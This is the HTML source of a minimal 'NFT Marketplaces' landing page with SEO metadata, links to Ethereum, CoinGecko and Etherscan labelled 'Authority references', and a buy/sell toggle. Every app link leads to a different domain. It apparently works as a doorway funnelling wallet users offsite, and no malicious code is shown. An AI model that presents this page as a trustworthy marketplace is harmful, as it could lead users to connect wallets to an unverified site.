<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>NFT Marketplaces</title>
  <meta name="description" content="NFT Marketplaces let you buy, sell and trade NFTs from your own wallet.">
  <link rel="canonical" href="https://nft-marketplaces.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F5FB">
  <meta property="og:type" content="website">
  <meta property="og:title" content="NFT Marketplaces">
  <meta property="og:description" content="NFT Marketplaces let you buy, sell and trade NFTs from your own wallet.">
  <meta property="og:url" content="https://nft-marketplaces.github.io/">
  <meta property="og:image" content="https://nft-marketplaces.github.io/favicon.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="NFT Marketplaces">
  <meta name="twitter:description" content="NFT Marketplaces let you buy, sell and trade NFTs from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://nft-marketplaces.github.io/#website",
        "url": "https://nft-marketplaces.github.io/",
        "name": "NFT Marketplaces",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://nft-marketplaces.github.io/#organization",
        "name": "NFT Marketplaces",
        "url": "https://nft-marketplaces.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://nft-marketplaces.github.io/#app",
        "name": "NFT Marketplaces",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://nft-marketplaces.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="NFT Marketplaces home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>NFT Marketplaces</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://ethereum.org/nft/" target="_blank" rel="nofollow noopener noreferrer">Ethereum guide</a>
      <a href="https://www.coingecko.com/en/nft" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://etherscan.io/nfttracker" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">NFT Marketplaces</h1>
      <p class="sub"><strong>NFT Marketplaces</strong> let you buy, sell and trade NFTs from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="NFT marketplace app preview">
      <div class="nft-tile" aria-hidden="true">
        <span></span>
      </div>
      <div class="trade-row">
        <span class="trade-copy">Buy and sell NFTs</span>
        <span class="eth-chip">
          <img src="eth.png" width="20" height="20" alt="ETH">
          ETH
        </span>
        <button class="toggle" type="button" data-toggle aria-label="Switch between buy and sell">
          <span data-toggle-label>Buy</span>
        </button>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">NFT Marketplaces &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-toggle]");
    var label = document.querySelector("[data-toggle-label]");
    if (!button || !label) return;
    button.addEventListener("click", function(){
      var sell = button.getAttribute("aria-pressed") !== "true";
      button.setAttribute("aria-pressed", sell ? "true" : "false");
      label.textContent = sell ? "Sell" : "Buy";
    });
  })();
  </script>
</body>
</html>
